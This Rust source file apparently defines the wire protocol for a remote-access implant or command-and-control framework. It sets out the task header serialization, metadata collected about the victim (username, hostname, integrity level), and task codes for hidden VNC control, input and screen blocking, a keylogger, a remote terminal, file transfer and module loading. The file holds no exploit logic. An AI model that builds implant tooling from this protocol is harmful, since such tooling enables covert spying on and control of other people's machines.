use serde::{Deserialize, Serialize};
use serde_repr::{Deserialize_repr, Serialize_repr};


#[repr(C,packed)]
#[derive(Clone, Copy,serde::Serialize, serde::Deserialize, Debug)]
pub struct task_header {
    pub Message_code:MESSAGE_CODE,
    pub flags:u16,
    pub session_id:u8,
    pub label:u32,
    pub status:u32,
    pub length:u32
}

impl task_header {
    pub fn new(Message_code:MESSAGE_CODE,flags:u16,session_id:u8,label:u32,status:u32,length:u32) -> task_header {

        /*
        #[cfg(debug_assertions)]
        {
            println!("message_code: {:#?} flags: {:x} session_id: {:x} label: {:x} status: {:x} length: {:x}",Message_code,
                flags,
                session_id,
                label,
                status,
                length
            );
        }
        */
        task_header {
            Message_code:Message_code,
            flags: flags,
            session_id:session_id,
            label: label,
            status:status,
            length: length
        }
    }

    pub fn to_raw(task_header:task_header) -> Vec<u8> {
        let raw_size = size_of::<task_header>();
        let mut raw = Vec::with_capacity(raw_size);
        raw.extend_from_slice(&(task_header.Message_code as u16).to_le_bytes());
        raw.extend_from_slice(&task_header.flags.to_le_bytes());
        raw.push(task_header.session_id);
        raw.extend_from_slice(&task_header.label.to_le_bytes());
        raw.extend_from_slice(&task_header.status.to_le_bytes());
        raw.extend_from_slice(&task_header.length.to_le_bytes());
        raw
    }

    pub fn from_raw(raw_header:&Vec<u8>) -> task_header {
        let message_code_field = u16::from_le_bytes([raw_header[0],raw_header[1]]);
        let message_code_field = MESSAGE_CODE::try_from(message_code_field).expect(format!("unknown message field {}",message_code_field).as_str());
       task_header {
            //handle this error
            Message_code:message_code_field,
            flags:u16::from_le_bytes([raw_header[2],raw_header[3]]),
            session_id:raw_header[4],
            label:u32::from_le_bytes([raw_header[5],raw_header[6],raw_header[7],raw_header[8]]),
            status:u32::from_le_bytes([raw_header[9],raw_header[10],raw_header[11],raw_header[12]]),
            length:u32::from_le_bytes([raw_header[13],raw_header[14],raw_header[15],raw_header[16]]),
        }
    }
}

#[derive(Clone, Copy,serde::Deserialize,serde::Serialize,Debug,PartialEq)]
#[repr(u16)]
pub enum MESSAGE_CODE {
    KEEP_ALIVE = 0,

	METADATA = 1,
    METADATA_COLLECT = 1<<8 | 1,
    METADATA_UPDATE = 1<<8 | 2,


	MODULE_LIST     = 2,
	MODULE_LOAD     = 2<<8 | 1,
	MODULE_UNLOAD   = 2<<8 | 2,
	MODULE_UPLOAD = 2<<8 | 3,
    MODULE_COMMAND  = 2<<8 | 4,
	
    FILE_COPY     = 3,
	FILE_MOVE     = 3<<8 | 1,
	FILE_DELETE   = 3<<8 | 2,
	FILE_UPLOAD   = 3<<8 | 3,
	FILE_DOWNLOAD = 3<<8 | 4,
	
    DIRECTORY_PRINT  = 4,
	DIRECTORY_CHANGE = 4<<8 | 1,
	DIRECTORY_CREATE = 4<<8 | 2,
	DIRECTORY_COPY   = 4<<8 | 3,
	DIRECTORY_MOVE   = 4<<8 | 4,
	DIRECTORY_LIST   = 4<<8 | 5,
	DIRECTORY_DELETE = 4<<8 | 6,

    DRIVE_LIST = 5<<8 | 5,

    VNC                   = 6,
    VNC_RGBA_DATA         = 6<<8 | 1,
    VNC_JPEG_DATA         = 6<<8 | 2,
    VNC_MOUSE_BUTTON      = 6<<8 | 3,
    VNC_MOUSE_MOVE        = 6<<8 | 4,
    VNC_SEND_KEY          = 6<<8 | 5,
    VNC_GET_WINDOWS       = 6<<8 | 6,
    VNC_SET_WINDOW        = 6<<8 | 7,
    VNC_GET_DESKTOP       = 6<<8 | 8,
    VNC_SET_DESKTOP       = 6<<8 | 9,
    VNC_GET_CLIPBOARD     = 6<<8 | 10,
    VNC_SET_CLIPBOARD     = 6<<8 | 11,
    VNC_GET_BROWSERS      = 6<<8 | 12,
    VNC_LAUNCH_BROWSER    = 6<<8 | 14,
    VNC_RESIZE_WINDOW     = 6<<8 | 15,
    VNC_REQUEST_FB_UPDATE = 6<<8 | 16,
    VNC_BLOCK_INPUT       = 6<<8 | 17,
    VNC_BLOCK_SCREEN      = 6<<8 | 18,

    TERMINAL = 7,

    TERMINAL_STDIN = 7<<8 | 1,
    TERMINAL_STDOUT = 7<<8 | 2,
    TERMINAL_SIGNAL = 7<<8 | 3,
    TERMINAL_LAUNCH = 7<<8 | 4,

    KEYLOGGER = 8,

    KEYLOGGER_START = 8<<8 | 1,
    KEYLOGGER_STOP = 8<<8 | 2,
    KEYLOGGER_GET = 8<<8 | 3,
    KEYLOGGER_POST = 8<<8 | 4,
}

impl TryFrom<u16> for MESSAGE_CODE {
    type Error = ();
    fn try_from(value: u16) -> Result<MESSAGE_CODE, Self::Error> {
        match value {
            0 => Ok(MESSAGE_CODE::KEEP_ALIVE),
            1 => Ok(MESSAGE_CODE::METADATA),
            257 => Ok(MESSAGE_CODE::METADATA_COLLECT),
            258 => Ok(MESSAGE_CODE::METADATA_UPDATE),
            2 => Ok(MESSAGE_CODE::MODULE_LIST),
            513 => Ok(MESSAGE_CODE::MODULE_LOAD),
            514 => Ok(MESSAGE_CODE::MODULE_UNLOAD),
            515 => Ok(MESSAGE_CODE::MODULE_UPLOAD),
            516 => Ok(MESSAGE_CODE::MODULE_COMMAND),
            3 => Ok(MESSAGE_CODE::FILE_COPY),
            769 => Ok(MESSAGE_CODE::FILE_MOVE),
            770 => Ok(MESSAGE_CODE::FILE_DELETE),
            771 => Ok(MESSAGE_CODE::FILE_UPLOAD),
            772 => Ok(MESSAGE_CODE::FILE_DOWNLOAD),
            4 => Ok(MESSAGE_CODE::DIRECTORY_PRINT),
            1025 => Ok(MESSAGE_CODE::DIRECTORY_CHANGE),
            1026 => Ok(MESSAGE_CODE::DIRECTORY_CREATE),
            1027 => Ok(MESSAGE_CODE::DIRECTORY_COPY),
            1028 => Ok(MESSAGE_CODE::DIRECTORY_MOVE),
            1029 => Ok(MESSAGE_CODE::DIRECTORY_LIST),
            1030 => Ok(MESSAGE_CODE::DIRECTORY_DELETE),
            1285 => Ok(MESSAGE_CODE::DRIVE_LIST),
            6 => Ok(MESSAGE_CODE::VNC),
            1537 => Ok(MESSAGE_CODE::VNC_RGBA_DATA),
            1538 => Ok(MESSAGE_CODE::VNC_JPEG_DATA),
            1539 => Ok(MESSAGE_CODE::VNC_MOUSE_BUTTON),
            1540 => Ok(MESSAGE_CODE::VNC_MOUSE_MOVE),
            1541 => Ok(MESSAGE_CODE::VNC_SEND_KEY),
            1542 => Ok(MESSAGE_CODE::VNC_GET_WINDOWS),
            1543 => Ok(MESSAGE_CODE::VNC_SET_WINDOW),
            1544 => Ok(MESSAGE_CODE::VNC_GET_DESKTOP),
            1545 => Ok(MESSAGE_CODE::VNC_SET_DESKTOP),
            1546 => Ok(MESSAGE_CODE::VNC_GET_CLIPBOARD),
            1547 => Ok(MESSAGE_CODE::VNC_SET_CLIPBOARD),
            1548 => Ok(MESSAGE_CODE::VNC_GET_BROWSERS),
            1550 => Ok(MESSAGE_CODE::VNC_LAUNCH_BROWSER),
            1551 => Ok(MESSAGE_CODE::VNC_RESIZE_WINDOW),
            1552 => Ok(MESSAGE_CODE::VNC_REQUEST_FB_UPDATE),
            1553 => Ok(MESSAGE_CODE::VNC_BLOCK_INPUT),
            1554 => Ok(MESSAGE_CODE::VNC_BLOCK_SCREEN),
            7 => Ok(MESSAGE_CODE::TERMINAL),
            1793 => Ok(MESSAGE_CODE::TERMINAL_STDIN),
            1794 => Ok(MESSAGE_CODE::TERMINAL_STDOUT),
            1795 => Ok(MESSAGE_CODE::TERMINAL_SIGNAL),
            1796 => Ok(MESSAGE_CODE::TERMINAL_LAUNCH),
            _ => Err(()),
        }
    }
}

impl From<MESSAGE_CODE> for u16 {
    fn from(code: MESSAGE_CODE) -> u16 {
        code as u16
    }
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct MODULE_UNLOAD_REQ {
    pub module_name: String,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct MODULE_LOAD_REQ {
    pub module_name: String,
    pub load_method: String,
    pub resource_server:String,
    pub module_hash: String,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct MODULE_COMMAND_REQ {
    pub module_name:String,
    pub function:String,
    pub input_options:String,
}

//{"message":"","code":0,"context":"","hex_encoded":bool}
#[derive(Default,Serialize, Deserialize, Clone, Debug)]
pub struct TASK_ERROR {
    pub message:String,
    pub code:u64,
    pub context:String,
    pub hex_encoded:bool
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct MODULE_LIST_RESPONSE {
    pub modules: Vec<String>,
}



#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct OUTPUT {
    pub output:String,
}

#[derive(Serialize_repr, Deserialize_repr, Clone, Copy, Debug)]
#[repr(u8)]
pub enum arch {
    x86 = 0,
    x64 = 1,
    arm = 2,
    arm64 = 3,
}

#[derive(Serialize_repr, Deserialize_repr, Clone, Copy, Debug)]
#[repr(u8)]
pub enum platform {
    linux = 0,
    macos = 1,
    windows = 2
}

#[derive(Clone,serde::Serialize, serde::Deserialize, Debug)]
pub struct implant_meta_data {
    pub id:u32,
    pub key:[u8;32],
    pub username:String,
    pub hostname:String,
    pub image_path:String,
    pub pid:u32,
    pub arch:arch,
    pub platform:platform,
    pub os_description:String,
    pub integrity:u32,
}